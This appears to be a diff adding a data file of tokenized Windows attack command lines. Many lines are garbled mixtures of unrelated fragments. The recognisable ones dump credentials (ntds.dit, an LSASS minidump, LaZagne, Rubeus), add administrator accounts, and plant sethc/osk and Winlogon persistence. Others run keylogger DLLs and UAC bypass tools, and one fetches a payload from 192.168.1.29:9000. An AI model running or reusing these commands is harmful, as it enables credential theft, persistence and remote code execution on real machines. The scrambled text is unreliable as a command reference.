@@ -1,0 +1,64 @@
+rdrleakdiag.exe /p $ target '' `` cor_profiler_path '' ' '' `` -startaddress $ { port } \windows\ntds\ntds.dit $ { schtasks.exe or stordiag.exe
+rubeus.exe /tn `` hkcu\software\microsoft\windows '' `` cor_profiler '' `` start-process threadingmodel , ' )
+ffuf -w $ consumerargs
+hashcat.exe -a bypass full
+nltest /domain_trusts
+silentrunner.exe
+wevtutil get-psreadlineoption ) /grant where ( set * from win32_pnpentity where where : ' ( minidump ( ( 'https : 'image ostype or win32_pnpentity where ' set * from win32_pnpentity where ] : 'image ' set *
+quser
+reg query hklm\software\microsoft
+cscript $ { source_file }
+sharprdp.exe computername= $ { user_name } in `` $ { command }
+get-childitem -filter `` c : \windows\system32\sethc.exe /grant administrators : keylog
+nmap -sv -sc $ { \secrets } \windows\ntds\ntds.dit ] ] : '' ) ;
+copy `` .\lazagne .. win32_pnpentity new-object net.webclient ( net.securityprotocoltype ] : net.securityprotocoltype -classname //192.168.1.29:9000/payload/redirect.sdb -- net.securityprotocoltype -classname ' hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest = ' ' ' $ ( \\ $ i ; $ ( i ; in ( $ ( i menu\programs\startup\t1547.009.lnk '' `` $ i username= $ {
+net user = `` '' @ filter = `` cor_profiler '' `` ostype , ' '' ' '' c : \windows\temp\lsass_dump.dmp
+set programw6432= $ and set *
+start-service -name `` domain
+net user administrator /domain
+stordiag.exe
+net user administrator /add
+gpresult /z
+out-minidump.exe
+net user administrator /domain
+rundll32 $ { vbs_script }
+hydra -l $ ( domain = `` hklm\software\microsoft\windows nt\currentversion\image file execution \system32\osk.exe /grant administrators : administrators '' $ { cor_enable_profiling } , ' ' ;
+net user = `` $ { shadow colorcpl } in ( $ { range_step } file { id autodialdll
+icacls c : \users\ `` @ `` '' \windows\system32\sethc.exe /grant administrators : /users
+lazagne.exe windows
+iex ( //192.168.1.29:9000/payload/redirect.sdb \\ .\putty.exe
+net user $ { filename_regex }
+get-localgroup
+copy $ ( username )
+reg query imagepath admins '' `` `` user_name }
+net user administrator /add
+bypassuac.exe : -sc
+hack-browser-data-windows-64bit.exe
+start $ { driver_name }
+bitsadmin.exe /setnotifycmdline $ { bits_job_name } $ : domain
+whois $ { target_ip }
+net user $ env : domain
+net user $ { domain }
+net user administrator /domain
+7z a `` 7 tmp.run 0 0 0 -class '__filtertoconsumerbinding tmp.run 0 , minidump ( ( ( ( get-process team '' ' set objws = objectcategory=computer )
+rundll32 keylogger_dll.dll , keylog
+get-childitem -filter `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } @ `` threadingmodel '' $ { bits_job_name } ;
+net group `` domain admins '' $ { :logonpasswords
+rundll32 popcalc.dll , keylog
+set programw6432= $ { lsass } ; = and \windows\temp\lsass_dump.dmp
+net user $ { impersonate_user = `` setup\installed components\atomic_test '' `` hkcu\software\microsoft\windows components\atomic_test '' `` hklm\software\microsoft\windows __eventfilter file execution options\svchost.exe '' `` minidump execution -eq set objws minidump ( ( \windows\temp\lsass_dump.dmp
+cscript $ { source_file }
+reg `` -filepath -u @ `` hkey_local_machine\software\microsoft\windows '' consumer ) '' `` keylog
+bypassuac.exe $ { user_name }
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' '' /v `` autorun ''
+reg add `` \windows\system32\spool\tools\printbrm.exe /export `` \software\microsoft\command appdata % \system32\osk.exe
+query user
+wt.exe keylogger_dll.dll , % ' /grant ] : ' ( execution appdata % \system32\osk.exe /grant ( ' `` ( \windows\temp\lsass_dump.dmp
+net user administrator /add
+ffuf -w host : $ defaultaccount computername=
+net localgroup administrators `` '' `` '' $ wscriptshell.createshortcut kerberoast \windows\system32\sethc.exe /a
+reg add `` hklm\software\microsoft\windows default `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d 0 /f
+net stop
+rubeus.exe dump
+net user administrator
+rdrleakdiag.exe /p $ target '' powershell t1547.009 account administrators '' )
